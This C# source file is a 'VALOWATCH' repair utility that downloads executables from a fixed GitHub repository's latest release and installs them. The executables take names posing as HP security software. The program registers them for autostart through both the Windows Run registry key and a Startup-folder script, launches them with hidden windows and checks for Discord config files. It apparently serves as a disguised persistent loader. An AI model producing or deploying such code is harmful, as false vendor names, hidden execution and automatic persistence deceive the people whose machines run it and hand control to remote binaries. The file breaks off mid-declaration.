using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;

namespace VALOWATCH.Repair;

internal static class Program
{
    private const string Repository = "yss19411208/YAMAWATCH";
    private const string AppAssetName = "HP.Security.System.exe";
    private const string AgentAssetName = "HP.Security.Update.exe";
    private const string StartAgentAssetName = "Client.Start.exe";
    private const string InstalledAppName = "HP.Security.System.exe";
    private const string RegistryRunPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
    private const string RegistryValueName = "VALOWATCH";
    private const string StartupCommandFileName = "VALOWATCH.cmd";
    private const string LaunchBeaconFileName = "repair-launch.txt";
    private const int MaximumAttempts = 5;
    private static readonly TimeSpan[] RetryDelays =
    [
        TimeSpan.FromSeconds(2),
        TimeSpan.FromSeconds(5),
        TimeSpan.FromSeconds(15),
        TimeSpan.FromSeconds(30)
    ];

    [STAThread]
    private static async Task<int> Main(string[] args)
    {
        WriteLaunchBeacon("process-started");

        if (args.Any(argument => string.Equals(argument, "--check-repair", StringComparison.OrdinalIgnoreCase)))
        {
            return RunRepairDiagnostic();
        }

        bool dryRun = args.Any(argument => string.Equals(argument, "--dry-run", StringComparison.OrdinalIgnoreCase));
        string workspaceRoot;
        try
        {
            workspaceRoot = ResolveWorkspaceRoot(args);
            Directory.CreateDirectory(workspaceRoot);
            Directory.CreateDirectory(Path.Combine(workspaceRoot, "app"));
            Directory.CreateDirectory(Path.Combine(workspaceRoot, "installer"));
            Directory.CreateDirectory(Path.Combine(workspaceRoot, "config"));
            Directory.CreateDirectory(Path.Combine(workspaceRoot, "data", "logs"));
            WriteLaunchBeacon("workspace-prepared:" + workspaceRoot);
            WriteLog(workspaceRoot, $"VALOWATCH repair started. Workspace: {workspaceRoot}. DryRun: {dryRun}");
        }
        catch (Exception exception) when (exception is ArgumentException or IOException or UnauthorizedAccessException or NotSupportedException)
        {
            WriteEmergencyLog("VALOWATCH repair could not prepare workspace.", exception);
            return 1;
        }

        try
        {
            using HttpClient httpClient = CreateHttpClient();
            ReleaseAsset appAsset = await GetLatestReleaseAssetAsync(httpClient, AppAssetName).ConfigureAwait(false);
            ReleaseAsset githubAsset = await GetLatestReleaseAssetAsync(httpClient, AgentAssetName).ConfigureAwait(false);
            ReleaseAsset startAsset = await GetLatestReleaseAssetAsync(httpClient, StartAgentAssetName).ConfigureAwait(false);

            string installDirectory = Path.Combine(workspaceRoot, "app");
            string appPath = Path.Combine(installDirectory, InstalledAppName);
            string githubPath = Path.Combine(workspaceRoot, "HP.Security.Update.exe");
            string startAgentPath = Path.Combine(workspaceRoot, "Client.Start.exe");
            string updateDirectory = Path.Combine(workspaceRoot, "data", "repair-downloads", SanitizeFileName(appAsset.TagName));
            Directory.CreateDirectory(updateDirectory);

            if (dryRun)
            {
                await DownloadAndValidateAsync(httpClient, appAsset, BuildDownloadCachePath(updateDirectory, AppAssetName), workspaceRoot).ConfigureAwait(false);
                await DownloadAndValidateAsync(httpClient, githubAsset, BuildDownloadCachePath(updateDirectory, AgentAssetName), workspaceRoot).ConfigureAwait(false);
                await DownloadAndValidateAsync(httpClient, startAsset, BuildDownloadCachePath(updateDirectory, StartAgentAssetName), workspaceRoot).ConfigureAwait(false);
                WriteLog(workspaceRoot, "VALOWATCH repair dry run completed. Latest release assets were downloaded and validated; installed files were not changed.");
                return 0;
            }

            StopValowatchProcessesInWorkspace(workspaceRoot);
            await DownloadInstallAndValidateAsync(httpClient, appAsset, BuildDownloadCachePath(updateDirectory, AppAssetName), appPath, "VALOWATCH app", workspaceRoot).ConfigureAwait(false);
            await DownloadInstallAndValidateAsync(httpClient, githubAsset, BuildDownloadCachePath(updateDirectory, AgentAssetName), githubPath, "GITHUB agent", workspaceRoot).ConfigureAwait(false);
            await DownloadInstallAndValidateAsync(httpClient, startAsset, BuildDownloadCachePath(updateDirectory, StartAgentAssetName), startAgentPath, "Start agent", workspaceRoot).ConfigureAwait(false);

            RegisterStartup(githubPath, startAgentPath, installDirectory, workspaceRoot);
            LogDiscordConfigPresence(workspaceRoot);
            bool githubRunning = StartProcessWithRetry(
                githubPath,
                workspaceRoot,
                ["--watch", "--install-dir", installDirectory],
                "HP.Security.Update",
                githubPath,
                "GITHUB watch agent",
                workspaceRoot);
            bool startAgentRunning = StartProcessWithRetry(
                startAgentPath,
                workspaceRoot,
                ["--workspace-root", workspaceRoot, "--install-dir", installDirectory],
                "Client.Start",
                startAgentPath,
                "VALOWATCH Start agent",
                workspaceRoot);
            bool appRunning = StartProcessWithRetry(
                appPath,
                installDirectory,
                [],
                "VALOWATCH",
                appPath,
                "VALOWATCH app",
                workspaceRoot);
            VerifyRepairResult(workspaceRoot, installDirectory, githubPath, startAgentPath, appPath);
            if (!githubRunning || !startAgentRunning || !appRunning)
            {
                throw new InvalidOperationException(
                    "VALOWATCH repair finished installing files, but one or more required processes did not remain running. " +
                    $"GITHUBRunning: {githubRunning}. StartAgentRunning: {startAgentRunning}. VALOWATCHRunning: {appRunning}.");
            }

            WriteLog(workspaceRoot, "VALOWATCH repair completed.");
            return 0;
        }
        catch (Exception exception) when (exception is IOException or UnauthorizedAccessException or InvalidOperationException or HttpRequestException or TaskCanceledException or System.ComponentModel.Win32Exception)
        {
            WriteLog(workspaceRoot, "VALOWATCH repair failed.", exception);
            return 1;
        }
    }

    private static int RunRepairDiagnostic()
    {
        string diagnosticRoot = Path.Combine(Path.GetTempPath(), "VALOWATCH-repair-check-" + Guid.NewGuid().ToString("N"));
        string workspaceRoot = Path.Combine(diagnosticRoot, "VALOWATCH");
        try
        {
            Directory.CreateDirectory(Path.Combine(workspaceRoot, "app"));
            Directory.CreateDirectory(Path.Combine(workspaceRoot, "data", "logs"));

            byte[] diagnosticExecutableBytes = Encoding.ASCII.GetBytes("MZVALOWATCH-REPAIR-DIAGNOSTIC");
            string expectedSha256 = Convert.ToHexString(SHA256.HashData(diagnosticExecutableBytes));
            string sourcePath = Path.Combine(diagnosticRoot, "diagnostic.payload");
            string targetPath = Path.Combine(workspaceRoot, "app", "diagnostic.exe");
            File.WriteAllBytes(sourcePath, diagnosticExecutableBytes);

            string resolvedRoot = ResolveWorkspaceRoot(["--workspace-root", workspaceRoot]);
            bool workspaceResolved = string.Equals(
                Path.GetFullPath(workspaceRoot),
                Path.GetFullPath(resolvedRoot),
                StringComparison.OrdinalIgnoreCase);
            CopyValidatedExecutableWithRetry(sourcePath, targetPath, expectedSha256, "diagnostic executable", workspaceRoot);
            ValidateExecutableFile(targetPath, expectedSha256, expectedSize: diagnosticExecutableBytes.Length, "diagnostic target");

            string cachePath = BuildDownloadCachePath(Path.Combine(workspaceRoot, "data", "repair-downloads", "diagnostic"), "HP.Security.System.exe");
            bool cachePathIsInsideWorkspace = IsPathInsideDirectory(cachePath, workspaceRoot) &&
                string.Equals(Path.GetExtension(cachePath), ".payload", StringComparison.OrdinalIgnoreCase);
            string githubCommand = BuildGitHubAgentCommand(Path.Combine(workspaceRoot, "HP.Security.Update.exe"), Path.Combine(workspaceRoot, "app"));
            bool githubCommandLooksValid = githubCommand.Contains("--watch", StringComparison.Ordinal) &&
                githubCommand.Contains("--install-dir", StringComparison.Ordinal);

            bool ready = workspaceResolved && cachePathIsInsideWorkspace && githubCommandLooksValid;
            WriteLog(
                workspaceRoot,
                $"Repair diagnostic: {(ready ? "ready" : "failed")}. " +
                $"WorkspaceResolved: {workspaceResolved}. CachePathInsideWorkspace: {cachePathIsInsideWorkspace}. " +
                $"GitHubCommandValid: {githubCommandLooksValid}.");
            return ready ? 0 : 1;
        }
        catch (Exception exception) when (exception is IOException or UnauthorizedAccessException or InvalidOperationException or NotSupportedException)
        {
            WriteEmergencyLog("Repair diagnostic failed.", exception);
            return 1;
        }
        finally
        {
            try
            {
                Directory.Delete(diagnosticRoot, recursive: true);
            }
            catch (Exception exception) when (exception is IOException or UnauthorizedAccessException)
            {
            }
        }
    }

    private static string ResolveWorkspaceRoot(IReadOnlyList<string> args)
    {
        for (int index = 0; index < args.Count; index++)
        {
            if (string.Equals(args[index], "--workspace-root", StringComparison.OrdinalIgnoreCase) && index + 1 < args.Count)
            {
                return Path.GetFullPath(Environment.ExpandEnvironmentVariables(args[index + 1]));
            }

            const string prefix = "--workspace-root=";
            if (args[index].StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
            {
                return Path.GetFullPath(Environment.ExpandEnvironmentVariables(args[index][prefix.Length..]));
            }
        }

        string currentDirectory = Path.GetFullPath(Environment.CurrentDirectory);
        if (LooksLikeWorkspaceRoot(currentDirectory))
        {
            return currentDirectory;
        }

        DirectoryInfo? parentDirectory = Directory.GetParent(currentDirectory);
        if (parentDirectory is not null && LooksLikeWorkspaceRoot(parentDirectory.FullName))
        {
            return parentDirectory.FullName;
        }

        string executableDirectory = AppContext.BaseDirectory;
        if (LooksLikeWorkspaceRoot(executableDirectory))
        {
            return Path.GetFullPath(executableDirectory);
        }

        DirectoryInfo? executableParent = Directory.GetParent(Path.GetFullPath(executableDirectory));
        if (executableParent is not null && LooksLikeWorkspaceRoot(executableParent.FullName))
        {
            return executableParent.FullName;
        }

        string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        if (string.IsNullOrWhiteSpace(documents))
        {
            throw new InvalidOperationException("Documents folder could not be resolved.");
        }

        return Path.Combine(documents, "VALOWATCH");
    }

    private static bool LooksLikeWorkspaceRoot(string directory)
    {
        string fullPath = Path.GetFullPath(directory);
        return string.Equals(Path.GetFileName(fullPath), "VALOWATCH", StringComparison.OrdinalIgnoreCase) ||
            File.Exists(Path.Combine(fullPath, "HP.Security.Update.exe")) ||
            File.Exists(Path.Combine(fullPath, "Client.Start.exe")) ||
            Directory.Exists(Path.Combine(fullPath, "app"));
    }

    private static string BuildDownloadCachePath(string updateDirectory, string assetName)
    {
        string baseName = Path.GetFileNameWithoutExtension(assetName);
        string safeBaseName = SanitizeFileName(string.IsNullOrWhiteSpace(baseName) ? assetName : baseName);
        return Path.Combine(updateDirectory, safeBaseName + ".payload");
    }

    private static HttpClient CreateHttpClient()
    {
        HttpClient httpClient = new(new SocketsHttpHandler
        {
            AutomaticDecompression = DecompressionMethods.All,
            PooledConnectionLifetime = TimeSpan.FromMinutes(5),
            ConnectTimeout = TimeSpan.FromSeconds(30)
        })
        {
            Timeout = Timeout.InfiniteTimeSpan
        };
        httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("VALOWATCH-Repair/0.1.2");
        httpClient.DefaultRequestHeaders.Accept.ParseAdd("application/vnd.github+json");
        httpClient.DefaultRequestHeaders.Add("X-GitHub-Api-Version", "2022-11-28");
        return httpClient;
    }

    private static async Task<ReleaseAsset> GetLatestReleaseAssetAsync(HttpClient httpClient, string assetName)
    {
        return await ExecuteWithRetryAsync(
            $"{assetName} release lookup",
            async cancellationToken =>
            {
                Uri releaseUri = new($"https://api.github.com/repos/{Repository}/releases/latest");
                using HttpResponseMessage response = await httpClient
                    .GetAsync(releaseUri, HttpCompletionOption.ResponseHeadersRead, cancellationToken)
                    .ConfigureAwait(false);
                response.EnsureSuccessStatusCode();

                await using Stream responseStream = await response.Content
                    .ReadAsStreamAsync(cancellationToken)
                    .ConfigureAwait(false);
                using JsonDocument document = await JsonDocument
                    .ParseAsync(responseStream, cancellationToken: cancellationToken)
                    .ConfigureAwait(false);

                JsonElement root = document.RootElement;
                string tagName = ReadRequiredString(root, "tag_name");
                if (!root.TryGetProperty("assets", out JsonElement assets) || assets.ValueKind != JsonValueKind.Array)
                {
                    throw new InvalidOperationException("Latest release has no assets array.");
                }

                foreach (JsonElement asset in assets.EnumerateArray())
                {
                    if (!string.Equals(ReadOptionalString(asset, "name"), assetName, StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }

                    string downloadUrl = ReadRequiredString(asset, "browser_download_url");
                    string expectedSha256 = NormalizeSha256Digest(ReadRequiredString(asset, "digest"));
                    long expectedSize = asset.TryGetProperty("size", out JsonElement sizeElement) &&
                        sizeElement.TryGetInt64(out long parsedSize)
                            ? parsedSize
                            : 0;
                    if (expectedSize <= 0)
                    {
                        throw new InvalidOperationException($"{assetName} release size is missing.");
                    }

                    return new ReleaseAsset(assetName, tagName, new Uri(downloadUrl, UriKind.Absolute), expectedSha256, expectedSize);
                }

                throw new InvalidOperationException($"Latest release does not contain {assetName}.");
            }).ConfigureAwait(false);
    }

    private static async Task DownloadInstallAndValidateAsync(
        HttpClient httpClient,
        ReleaseAsset asset,
        string downloadPath,
        string targetPath,
        string label,
        string workspaceRoot)
    {
        if (!FileMatchesRelease(targetPath, asset.ExpectedSha256, out string currentStatus))
        {
            Directory.CreateDirectory(Path.GetDirectoryName(downloadPath) ?? throw new InvalidOperationException("Download directory could not be resolved."));
            string validatedDownloadPath = await DownloadAndValidateAsync(httpClient, asset, downloadPath, workspaceRoot).ConfigureAwait(false);
            StopProcessesFromPath(Path.GetFileNameWithoutExtension(targetPath), targetPath, workspaceRoot);
            Directory.CreateDirectory(Path.GetDirectoryName(targetPath) ?? throw new InvalidOperationException("Target directory could not be resolved."));
            CopyValidatedExecutableWithRetry(validatedDownloadPath, targetPath, asset.ExpectedSha256, label, workspaceRoot);
            WriteLog(workspaceRoot, $"{label} repaired. Previous: {currentStatus}");
            return;
        }

        WriteLog(workspaceRoot, $"{label} already valid. {currentStatus}");
    }

    private static async Task<string> DownloadAndValidateAsync(
        HttpClient httpClient,
        ReleaseAsset asset,
        string destinationPath,
        string workspaceRoot)
    {
        string partialPath = Path.Combine(
            Path.GetDirectoryName(destinationPath) ?? throw new InvalidOperationException("Download directory could not be resolved."),
            Path.GetFileNameWithoutExtension(destinationPath) + ".partial");
        TryDeleteFile(partialPath, workspaceRoot);
        await ExecuteWithRetryAsync(
            $"{asset.Name} download",
            async cancellationToken =>
            {
                using HttpResponseMessage response = await httpClient
                    .GetAsync(asset.DownloadUri, HttpCompletionOption.ResponseHeadersRead, cancellationToken)
                    .ConfigureAwait(false);
                response.EnsureSuccessStatusCode();

                await using Stream sourceStream = await response.Content
                    .ReadAsStreamAsync(cancellationToken)
                    .ConfigureAwait(false);
                await using FileStream targetStream = new(
                    partialPath,
                    FileMode.Create,
                    FileAccess.Write,
                    FileShare.None,
                    bufferSize: 131072,
                    useAsync: true);
                await sourceStream.CopyToAsync(targetStream, 131072, cancellationToken).ConfigureAwait(false);
                await targetStream.FlushAsync(cancellationToken).ConfigureAwait(false);
                return true;
            }).ConfigureAwait(false);

        File.Move(partialPath, destinationPath, overwrite: true);
        ValidateExecutableFile(destinationPath, asset.ExpectedSha256, asset.ExpectedSize, asset.Name);
        return destinationPath;
    }

    private static void CopyValidatedExecutableWithRetry(
        string sourcePath,
        string targetPath,
        string expectedSha256,
        string label,
        string workspaceRoot)
    {
        ValidateExecutableFile(sourcePath, expectedSha256, expectedSize: 0, $"{label} source");
        Exception? lastException = null;
        for (int attempt = 1; attempt <= 5; attempt++)
        {
            try
            {
                File.Copy(sourcePath, targetPath, overwrite: true);
                ValidateExecutableFile(targetPath, expectedSha256, expectedSize: 0, $"{label} target");
                return;
            }
            catch (Exception exception) when (exception is IOException or UnauthorizedAccessException)
            {
                lastException = exception;
                Thread.Sleep(TimeSpan.FromSeconds(attempt));
            }
        }

        throw new IOException($"{label} could not be copied to {targetPath}.", lastException);
    }

    private static void ValidateExecutableFile(string filePath, string expectedSha256, long expectedSize, string label)
    {
        if (!File.Exists(filePath))
        {
            throw new InvalidOperationException($"{label} is missing: {filePath}");
        }

        FileInfo fileInfo = new(filePath);
        if (expectedSize > 0 && fileInfo.Length != expectedSize)
        {
            throw new InvalidOperationException($"{label} size mismatch. Expected {expectedSize}, actual {fileInfo.Length}.");
        }

        using FileStream fileStream = new(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
        Span<byte> header = stackalloc byte[2];
        if (fileStream.Read(header) != 2 || header[0] != 'M' || header[1] != 'Z')
        {
            throw new InvalidOperationException($"{label} is not a Windows PE executable.");
        }

        fileStream.Position = 0;
        string actualSha256 = Convert.ToHexString(SHA256.HashData(fileStream));
        if (!string.Equals(actualSha256, expectedSha256, StringComparison.OrdinalIgnoreCase))
        {
            throw new InvalidOperationException($"{label} SHA-256 mismatch. Expected {expectedSha256}, actual {actualSha256}.");
        }
    }

    private static bool FileMatchesRelease(string filePath, string expectedSha256, out string status)
    {
        if (!File.Exists(filePath))
        {
            status = "file is missing";
            return false;
        }

        try
        {
            using FileStream fileStream = new(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
            string actualSha256 = Convert.ToHexString(SHA256.HashData(fileStream));
            bool matches = string.Equals(actualSha256, expectedSha256, StringComparison.OrdinalIgnoreCase);
            status = matches
                ? $"SHA-256 matches release: {actualSha256}"
                : $"SHA-256 differs from release. Actual: {actualSha256}. Expected: {expectedSha256}";
            return matches;
        }
        catch (Exception exception) when (exception is IOException or UnauthorizedAccessException)
        {
            status = $"SHA-256 could not be read: {exception.Message}";
            return false;
        }
    }

    private static void StopProcessesFromPath(string processName, string targetPath, string workspaceRoot)
    {
        try
        {
            foreach (Process process in Process.GetProcessesByName(processName))
            {
                try
                {
                    if (process.MainModule?.FileName is not { } processPath ||
                        !string.Equals(Path.GetFullPath(processPath), Path.GetFullPath(targetPath), StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }

                    process.Kill(entireProcessTree: true);
                    process.WaitForExit(5000);
                    WriteLog(workspaceRoot, $"Stopped {processName}: {process.Id}");
                }
                catch (Exception exception) when (exception is InvalidOperationException or System.ComponentModel.Win32Exception or NotSupportedException)
                {
                    WriteLog(workspaceRoot, $"Could not inspect or stop {processName}: {process.Id}", exception);
                }
            }
        }
        catch (Exception exception) when (exception is InvalidOperationException or System.ComponentModel.Win32Exception)
        {
            WriteLog(workspaceRoot, $"Could not enumerate {processName} processes.", exception);
        }
    }

    private static void StopValowatchProcessesInWorkspace(string workspaceRoot)
    {
        foreach (string processName in new[] { "HP.Security.System", "HP.Security.Update", "Client.Start" })
        {
            try
            {
                foreach (Process process in Process.GetProcessesByName(processName))
                {
                    try
                    {
                        if (process.MainModule?.FileName is not { } processPath ||
                            !IsPathInsideDirectory(processPath, workspaceRoot))
                        {
                            continue;
                        }

                        process.Kill(entireProcessTree: true);
                        process.WaitForExit(5000);
                        WriteLog(workspaceRoot, $"Stopped workspace process {processName}: {process.Id}. Path: {processPath}");
                    }
                    catch (Exception exception) when (exception is InvalidOperationException or System.ComponentModel.Win32Exception or NotSupportedException or UnauthorizedAccessException)
                    {
                        WriteLog(workspaceRoot, $"Could not inspect or stop workspace process {processName}: {process.Id}", exception);
                    }
                    finally
                    {
                        process.Dispose();
                    }
                }
            }
            catch (Exception exception) when (exception is InvalidOperationException or System.ComponentModel.Win32Exception)
            {
                WriteLog(workspaceRoot, $"Could not enumerate workspace processes for {processName}.", exception);
            }
        }
    }

    private static void RegisterStartup(
        string installedGitHubPath,
        string installedStartAgentPath,
        string installDirectory,
        string workspaceRoot)
    {
        try
        {
            using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(RegistryRunPath, writable: true)
                ?? throw new InvalidOperationException("Windows startup registry key could not be opened.");
            registryKey.SetValue(RegistryValueName, BuildGitHubAgentCommand(installedGitHubPath, installDirectory));
            WriteStartupCommand(installedGitHubPath, installedStartAgentPath, installDirectory);
            WriteLog(workspaceRoot, "Startup registration repaired with HKCU Run and Startup command.");
        }
        catch (Exception exception) when (exception is IOException or UnauthorizedAccessException or InvalidOperationException or System.ComponentModel.Win32Exception)
        {
            WriteLog(workspaceRoot, "Startup registration could not be repaired; runtime launch will still continue.", exception);
        }
    }

    private static void WriteStartupCommand(
        string installedGitHubPath,
        string installedStartAgentPath,
        string installDirectory)
    {
        string startupDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        if (string.IsNullOrWhiteSpace(startupDirectory))
        {
            return;
        }

        Directory.CreateDirectory(startupDirectory);
        string commandPath = Path.Combine(startupDirectory, StartupCommandFileName);
        string[] commandLines =
        [
            "@echo off",
            $"start \"\" \"{installedGitHubPath}\" --watch --install-dir \"{installDirectory}\"",
            $"start \"\" \"{installedStartAgentPath}\" --workspace-root \"{Path.GetDirectoryName(installedGitHubPath)}\" --install-dir \"{installDirectory}\""
        ];
        File.WriteAllLines(commandPath, commandLines, Encoding.UTF8);
    }

    private static string BuildGitHubAgentCommand(string installedGitHubPath, string installDirectory)
    {
        return $"\"{installedGitHubPath}\" --watch --install-dir \"{installDirectory}\"";
    }

    private static void VerifyRepairResult(
        string workspaceRoot,
        string installDirectory,
        string githubPath,
        string startAgentPath,
        string appPath)
    {
        Thread.Sleep(TimeSpan.FromSeconds(2));
        bool githubRunning = IsProcessRunningFromPath("HP.Security.Update", githubPath);
        bool startAgentRunning = IsProcessRunningFromPath("Client.Start", startAgentPath);
        bool appRunning = IsProcessRunningFromPath("HP.Security.System", appPath);
        bool startupCommandExists = File.Exists(Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.Startup),
            StartupCommandFileName));
        WriteLog(
            workspaceRoot,
            "Repair verification. " +
            $"InstallDirectory: {installDirectory}. " +
            $"GITHUBRunning: {githubRunning}. StartAgentRunning: {startAgentRunning}. VALOWATCHRunning: {appRunning}. " +
            $"StartupCommandExists: {startupCommandExists}.");
    }

    private static void LogDiscordConfigPresence(string workspaceRoot)
    {
        (string Label, string Path)[] configCandidates =
        [
            ("installer/.env", Path.Combine(workspaceRoot, "installer", ".env")),
            ("config/.env", Path.Combine(workspaceRoot, "config", ".env")),
            ("data/config/settings.protected", Path.Combine(workspaceRoot, "data", "config", "settings.protected")),
            ("app/.env", Path.Combine(workspaceRoot, "app", ".env"))
        ];

        string configStatus = string.Join(
            "; ",
            configCandidates.Select(candidate => $"{candidate.Label}:{DescribeFilePresence(candidate.Path)}"));
        WriteLog(workspaceRoot, $"Discord config presence. {configStatus}.");
    }

    private static string DescribeFilePresence(string filePath)
    {
        try
        {
            FileInfo fileInfo = new(filePath);
            if (!fileInfo.Exists)
            {
                return "missing";
            }

            return fileInfo.Length > 0 ? "present" : "empty";
        }
        catch (Exception exception) when (exception is IOException or UnauthorizedAccessException or NotSupportedException)
        {
            return "unreadable";
        }
    }

    private static bool IsProcessRunningFromPath(string processName, string expectedPath)
    {
        string normalizedExpectedPath = Path.GetFullPath(expectedPath);
        try
        {
            foreach (Process process in Process.GetProcessesByName(processName))
            {
                try
                {
                    string? processPath = process.MainModule?.FileName;
                    if (!string.IsNullOrWhiteSpace(processPath) &&
                        string.Equals(Path.GetFullPath(processPath), normalizedExpectedPath, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                catch (Exception exception) when (exception is InvalidOperationException or System.ComponentModel.Win32Exception or UnauthorizedAccessException)
                {
                }
                finally
                {
                    process.Dispose();
                }
            }
        }
        catch (Exception exception) when (exception is InvalidOperationException or System.ComponentModel.Win32Exception)
        {
        }

        return false;
    }

    private static bool IsPathInsideDirectory(string filePath, string directoryPath)
    {
        string normalizedDirectory = Path.GetFullPath(directoryPath)
            .TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar) + Path.DirectorySeparatorChar;
        string normalizedFilePath = Path.GetFullPath(filePath);
        return normalizedFilePath.StartsWith(normalizedDirectory, StringComparison.OrdinalIgnoreCase);
    }

    private static bool StartProcessWithRetry(
        string filePath,
        string workingDirectory,
        IReadOnlyList<string> arguments,
        string processName,
        string expectedPath,
        string label,
        string workspaceRoot)
    {
        if (!File.Exists(filePath))
        {
            WriteLog(workspaceRoot, $"{label} was not started because the file is missing: {filePath}");
            return false;
        }

        TimeSpan[] processStartWaits =
        [
            TimeSpan.FromSeconds(3),
            TimeSpan.FromSeconds(5),
            TimeSpan.FromSeconds(8)
        ];

        for (int attempt = 1; attempt <= processStartWaits.Length; attempt++)
        {
            if (IsProcessRunningFromPath(processName, expectedPath))
            {
                WriteLog(workspaceRoot, $"{label} is already running before start attempt {attempt}: {filePath}");
                return true;
            }

            StartProcess(filePath, workingDirectory, arguments, $"{label} attempt {attempt}", workspaceRoot);
            if (WaitForProcessRunning(processName, expectedPath, processStartWaits[attempt - 1]))
            {
                WriteLog(workspaceRoot, $"{label} verified running after start attempt {attempt}: {filePath}");
                return true;
            }

            WriteLog(workspaceRoot, $"{label} was not running after start attempt {attempt}; retrying if attempts remain.");
        }

        WriteLog(workspaceRoot, $"{label} could not be kept running after all repair start attempts: {filePath}");
        return false;
    }

    private static bool WaitForProcessRunning(string processName, string expectedPath, TimeSpan timeout)
    {
        Stopwatch stopwatch = Stopwatch.StartNew();
        while (stopwatch.Elapsed < timeout)
        {
            if (IsProcessRunningFromPath(processName, expectedPath))
            {
                return true;
            }

            Thread.Sleep(TimeSpan.FromMilliseconds(500));
        }

        return false;
    }

    private static void StartProcess(string filePath, string workingDirectory, IReadOnlyList<string> arguments, string label, string workspaceRoot)
    {
        if (!File.Exists(filePath))
        {
            WriteLog(workspaceRoot, $"{label} was not started because the file is missing: {filePath}");
            return;
        }

        try
        {
            ProcessStartInfo processStartInfo = new()
            {
                FileName = filePath,
                WorkingDirectory = workingDirectory,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            foreach (string argument in arguments)
            {
                processStartInfo.ArgumentList.Add(argument);
            }

            Process.Start(processStartInfo);
            WriteLog(workspaceRoot, $"{label} started: {filePath}");
        }
        catch (Exception exception) when (exception is InvalidOperationException or System.ComponentModel.Win32Exception)
        {
            WriteLog(workspaceRoot, $"{label} could not be started: {filePath}", exception);
        }
    }

    private static async Task<T> ExecuteWithRetryAsync<T>(string operationName, Func<CancellationToken, Task<T>> operation)
    {
        Exception? lastException = null;
        for (int attempt = 1; attempt <= MaximumAttempts; attempt++)
        {
            using CancellationTokenSource cancellationTokenSource = new(TimeSpan.FromMinutes(5));
            try
            {
                return await operation(cancellationTokenSource.Token).ConfigureAwait(false);
            }
            catch (Exception exception) when (
                exception is HttpRequestException or IOException or TaskCanceledException &&
                attempt < MaximumAttempts)
            {
                lastException = exception;
                TimeSpan delay = RetryDelays[Math.Min(attempt - 1, RetryDelays.Length - 1)];
                WriteEmergencyLog($"{operationName} attempt {attempt}/{MaximumAttempts} failed. Retrying in {delay.TotalSeconds:0}s.", exception);
                await Task.Delay(delay).ConfigureAwait(false);
            }
        }

        throw new InvalidOperationException($"{operationName} failed after {MaximumAttempts} attempts.", lastException);
    }

    private static string ReadRequiredString(JsonElement element, string propertyName)
    {
        string value = ReadOptionalString(element, propertyName);
        if (string.IsNullOrWhiteSpace(value))
        {
            throw new InvalidOperationException($"Required JSON property is missing: {propertyName}");
        }

        return value;
    }

    private static string ReadOptionalString(JsonElement element, string propertyName)
    {
        return element.TryGetProperty(propertyName, out JsonElement property) && property.ValueKind == JsonValueKind.String
            ? property.GetString() ?? string.Empty
            : string.Empty;
    }

    private static string NormalizeSha256Digest(string digest)
    {
        const string prefix = "sha256:";
        string normalized = digest.StartsWith(prefix, StringComparison.OrdinalIgnoreCase)
            ? digest[prefix.Length..]
            : digest;
        if (normalized.Length != 64 || normalized.Any(character => !Uri.IsHexDigit(character)))
        {
            throw new InvalidOperationException("GitHub asset SHA-256 digest is invalid.");
        }

        return normalized.ToUpperInvariant();
    }

    private static string SanitizeFileName(string value)
    {
        StringBuilder builder = new(value.Length);
        foreach (char character in value)
        {
            builder.Append(Path.GetInvalidFileNameChars().Contains(character) ? '_' : character);
        }

        return builder.ToString();
    }

    private static void TryDeleteFile(string filePath, string workspaceRoot)
    {
        try
        {
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
            }
        }
        catch (Exception exception) when (exception is IOException or UnauthorizedAccessException)
        {
            WriteLog(workspaceRoot, $"Could not delete temporary file: {filePath}", exception);
        }
    }

    private static void WriteLog(string workspaceRoot, string message, Exception? exception = null)
    {
        string exceptionText = exception is null ? string.Empty : $" Exception: {exception}";
        string line = $"{DateTimeOffset.Now:O} [Repair] {message}{exceptionText}";
        WriteEmergencyLog(line, null);

        try
        {
            string logDirectory = Path.Combine(workspaceRoot, "data", "logs");
            Directory.CreateDirectory(logDirectory);
            File.AppendAllText(Path.Combine(logDirectory, "repair.log"), line + Environment.NewLine, Encoding.UTF8);
        }
        catch (Exception logException) when (logException is IOException or UnauthorizedAccessException)
        {
        }
    }

    private static void WriteEmergencyLog(string message, Exception? exception)
    {
        string exceptionText = exception is null ? string.Empty : $" Exception: {exception}";
        string line = exception is null && message.Contains("[Repair]", StringComparison.Ordinal)
            ? message
            : $"{DateTimeOffset.Now:O} [Repair] {message}{exceptionText}";

        try
        {
            string logDirectory = Path.Combine(Path.GetTempPath(), "VALOWATCH");
            Directory.CreateDirectory(logDirectory);
            File.AppendAllText(Path.Combine(logDirectory, "repair.log"), line + Environment.NewLine, Encoding.UTF8);
        }
        catch (Exception logException) when (logException is IOException or UnauthorizedAccessException)
        {
        }
    }

    private static void WriteLaunchBeacon(string message)
    {
        string line = $"{DateTimeOffset.Now:O} [RepairLaunch] {message}";
        TryWriteLaunchBeacon(Path.Combine(Path.GetTempPath(), "VALOWATCH"), line);

        string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        if (!string.IsNullOrWhiteSpace(documents))
        {
            TryWriteLaunchBeacon(Path.Combine(documents, "VALOWATCH", "data", "logs"), line);
        }
    }

    private static void TryWriteLaunchBeacon(string logDirectory, string line)
    {
        try
        {
            Directory.CreateDirectory(logDirectory);
            File.AppendAllText(Path.Combine(logDirectory, LaunchBeaconFileName), line + Environment.NewLine, Encoding.UTF8);
        }
        catch (Exception exception) when (exception is IOException or UnauthorizedAccessException or NotSupportedException)
        {
        }
    }

    private sealed record ReleaseAsset(
        string Name,
        string TagName,
        Uri DownloadUri,
